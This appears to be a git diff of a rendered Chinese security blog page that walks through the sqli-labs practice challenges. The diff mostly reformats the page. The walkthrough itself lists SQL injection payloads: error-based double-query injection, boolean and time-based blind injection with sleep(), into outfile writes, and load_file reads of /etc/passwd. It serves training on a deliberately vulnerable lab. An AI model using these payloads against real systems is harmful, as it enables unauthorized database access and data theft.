@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang>
-  <head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8">
+  <head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -13,7 +13,7 @@
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
-<meta name="description" content="sqli-labs挑战记录"><meta name="keywords" content="sec|secruity|blog"><link rel="alternate" href="/default" title="蛋挞的笔记本"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.1">
+<meta name="description" content="sqli-labs挑战记录"><meta name="keywords" content="sec|secruity|blog"><link rel="alternate" href="https://cxliker.github.io/rss" title="蛋挞的笔记本"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.1">
 <link rel="canonical" href="https://cxliker.github.io/2018/02/08/sqli-labs挑战记录/">
 
 <link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
@@ -120,20 +120,29 @@
 <h1 id="Less-1-4"><a href="#Less-1-4" class="headerlink" title="Less 1 - 4"></a>Less 1 - 4</h1><p>当找到注入点的时候，可以用order by 1/2/3来知道select中共有多少列。如果order by 不管用，可以用union select 1,2,3来判断，因为union要求左右两张表是一样的列数。</p>
 <p>当页面不显示数据返回的结果，但是有错误提示，可以利用错误提示将数据dump出来</p>
 <p>select concat((select database()))</p>
-<p>原理解释<a href="http://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a><br>select count(<em>), concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.tables group by a;<br>美化版<br>SELECT<br>    count(<em>),<br>    concat(<br>        0x3a,<br>        0x3a,<br>        (SELECT USER()),<br>        0x3a,<br>        0x3a,<br>        floor(rand(0) </em> 2)<br>    ) a<br>FROM<br>    information_schema. TABLES<br>GROUP BY<br>    a;</p>
-<p>所以可以进阶一下，查看更多信息<br>select count(<em>), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.tables group by a;<br>美化版<br>SELECT<br>    count(<em>),<br>    concat(<br>        0x3a,<br>        0x3a,<br>        (<br>            SELECT<br>                table_name  //此处无法用group_concat<br>            FROM<br>                information_schema. TABLES<br>            WHERE<br>                table_schema = DATABASE ()<br>            LIMIT 0,<br>            1<br>        ),<br>        0x3a,<br>        0x3a,<br>        floor(rand(0) </em> 2)<br>    ) a<br>FROM<br>    information_schema. TABLES<br>GROUP BY<br>    a;<br>改变limit就可以遍历了，但是子查询中不知道为什么用group_concat就不会错误，所以只能一个个改变limit来。</p>
+<p>原理解释<a href="http://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a><br>select count(<em>), concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a;<br>美化版<br>SELECT<br>    count(</em>),<br>    concat(<br>        0x3a,<br>        0x3a,<br>        (SELECT USER()),<br>        0x3a,<br>        0x3a,<br>        floor(rand(0) * 2)<br>    ) a<br>FROM<br>    information_schema. TABLES<br>GROUP BY<br>    a;</p>
+<p>所以可以进阶一下，查看更多信息<br>select count(<em>), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a;<br>美化版<br>SELECT<br>    count(</em>),<br>    concat(<br>        0x3a,<br>        0x3a,<br>        (<br>            SELECT<br>                table_name  //此处无法用group_concat<br>            FROM<br>                information_schema. TABLES<br>            WHERE<br>                table_schema = DATABASE ()<br>            LIMIT 0,<br>            1<br>        ),<br>        0x3a,<br>        0x3a,<br>        floor(rand(0) * 2)<br>    ) a<br>FROM<br>    information_schema. TABLES<br>GROUP BY<br>    a;<br>改变limit就可以遍历了，但是子查询中不知道为什么用group_concat就不会错误，所以只能一个个改变limit来。</p>
 <p>以下还有两种方式也是一样的效果。<br> select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2)</p>
 <p> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</p>
 <p> 当不能使用select * from 的时候，比如后面有and 语句。可以用盲注。</p>
 <h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p> 盲注，这种情况没有错误提时，只能通过true and false来判断。<br> 需要借助的函数是 ascii(), substr(), length() 这样来枚举一个字符串的长度，每一个字母来获取需要的信息。<br> 比如<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr(database(), 3, 1)) &lt;100 </span><br><span class="line">and ascii(substr((select table_name for information_schema.tables limit 1), 3 ,1)) &lt; 100</span><br></pre></td></tr></table></figure></p>
-<h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>上一题的盲注是基于真假值得。但是这一题的sql结果无论是否存在与否，网页前端都是同一个效果，所以我们这一题的盲注要通过一个小技巧，叫做时间盲注。要用到sleep()函数。<br>可以构造构造如下的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr(databse(), 3,1 )) = 90 and sleep(10)</span><br><span class="line">select if((select database())=&quot;security&quot;, sleep(10), null)</span><br><span class="line">select if((select database() like &quot;sec%&quot;), sleep(10), null)</span><br></pre></td></tr></table></figure></p>
+<h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>上一题的盲注是基于真假值得。但是这一题的sql结果无论是否存在与否，网页前端都是同一个效果，所以我们这一题的盲注要通过一个小技巧，叫做时间盲注。要用到sleep()函数。<br>可以构造构造如下的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr(databse(), 3,1 )) = 90 and sleep(10)</span><br><span class="line">select if((select database())=&quot;security&quot;, sleep(10), null)</span><br><span class="line">select if((select database() like &quot;sec%&quot;), sleep(10), null)</span><br></pre></td></tr></table></figure>
+
 <p>假如第一个字母是正确的话，那么我们网页就等等待10秒才返回结果，如果错误就立即返回了。通过这两个时间的差距，我们就可以判断。</p>
 <h1 id="using-outfile-lesst-7"><a href="#using-outfile-lesst-7" class="headerlink" title="using outfile (lesst-7)"></a>using outfile (lesst-7)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users into outfile &quot;/tmp/test.txt&quot;</span><br><span class="line">select * from users limit 1 into dumpfile &quot;/tmp/test.txt&quot;</span><br></pre></td></tr></table></figure>
+
 <p>outfile可以多行，dumpfile只能一行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;/etc/passwd&quot;) into outfile &quot;/tmp/test.txt&quot;</span><br><span class="line">``` </span><br><span class="line">路径名一般用网站的目录，至于网站的目录就用其他方法来猜测和确定。</span><br><span class="line"></span><br><span class="line"># less-12</span><br><span class="line">从11开始，就是post方法的注入了。</span><br><span class="line">这里也是基于页面的Mysql错误提示来猜测SQL的写法。</span><br><span class="line"></span><br><span class="line"># less 14</span><br><span class="line">因为这里成功登入之后没有任何有用的信息返回，但是错误SQL的时候页面会有错误提示，所以我们要用双重注入。</span><br></pre></td></tr></table></figure>
-<p>“ and (select 1 from (select count(<em>), (concat(“~”,version(),”~”,floor(rand(0)</em>2)))c from information_schema.tables GROUP BY c)a) #<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># less 16</span><br><span class="line">这题是盲注</span><br><span class="line"></span><br><span class="line"># less 17</span><br></pre></td></tr></table></figure></p>
-<p>update users set password=’$psd’ where username=’$uname’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这题就需要用双重注入</span><br><span class="line"></span><br><span class="line"># less 18</span><br></pre></td></tr></table></figure></p>
-<p> ‘::1’, ‘admin’)’ at line 1<br> insert into uagents (agents, ip , uname) value(‘’, ‘’, ‘admin’)<br> insert into uagents(agent, ip, uname) value(‘’ or 1 = ‘1’, ‘::1’, ‘admin’)<br> <code>`</code><br> 这里应该用双重注入</p>
+
+<p>“ and (select 1 from (select count(<em>), (concat(“<del>“,version(),”</del>“,floor(rand(0)</em>2)))c from information_schema.tables GROUP BY c)a) # </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># less 16</span><br><span class="line">这题是盲注</span><br><span class="line"></span><br><span class="line"># less 17</span><br></pre></td></tr></table></figure>
+
+<p>update users set password=’$psd’ where username=’$uname’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这题就需要用双重注入</span><br><span class="line"></span><br><span class="line"># less 18</span><br></pre></td></tr></table></figure>
+
+<p> ‘::1’, ‘admin’)’ at line 1<br> insert into uagents (agents, ip , uname) value(‘’, ‘’, ‘admin’)<br> insert into uagents(agent, ip, uname) value(‘’ or 1 = ‘1’, ‘::1’, ‘admin’)</p>
+<p> ```<br> 这里应该用双重注入</p>
 <h1 id="less-20"><a href="#less-20" class="headerlink" title="less 20"></a>less 20</h1><p> 基于cookie的注入， 这里其实也就是另一种形式的基于错误的注入。</p>
 <h1 id="less-21"><a href="#less-21" class="headerlink" title="less 21"></a>less 21</h1><p> 和上面一样，只是加多一道加密的过程。</p>
 <h1 id="有趣小知识"><a href="#有趣小知识" class="headerlink" title="有趣小知识"></a>有趣小知识</h1><ol>
@@ -165,7 +174,7 @@
 
       <footer id="footer" class="footer"><div class="social-links"><a href="mailto:cxliker@qq.com" class="iconfont icon-email" title="email"></a>
         <a href="https://github.com/cxliker" class="iconfont icon-github" title="github"></a>
-        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+        <a href="https://cxliker.github.io/rss" class="iconfont icon-rss" title="rss"></a>
     </div><div class="copyright">
   <span class="power-by">
     由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
